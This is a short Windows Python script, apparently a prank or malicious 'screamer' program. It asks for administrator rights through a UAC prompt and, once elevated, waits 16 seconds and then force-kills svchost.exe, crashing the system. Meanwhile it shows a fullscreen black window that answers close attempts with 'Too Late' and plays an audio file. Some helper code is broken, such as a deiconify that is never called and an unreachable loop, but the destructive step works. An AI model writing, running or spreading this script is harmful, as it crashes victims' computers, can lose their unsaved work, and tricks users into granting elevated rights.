import ctypes, sys
import tkinter as tk
from tkinter import messagebox
import playsound
import time
import os

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if is_admin():
   time.sleep(16)
   os.system("taskkill /f /im  svchost.exe")
else:
     ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

root = tk.Tk()
root.geometry("2000x2000")
root.configure(background='black')

def on_closing():

    if True:
        messagebox.showwarning("Too Late")


def onTop():
    root.lift()

def minimize_check():
    root.deiconify

onTop()
minimize_check()
root.protocol("WM_DELETE_WINDOW", on_closing)
root.attributes('-fullscreen', True)

playsound.playsound('audio.mp3')


root.mainloop()
while True:
    onTop()
    minimize_check()


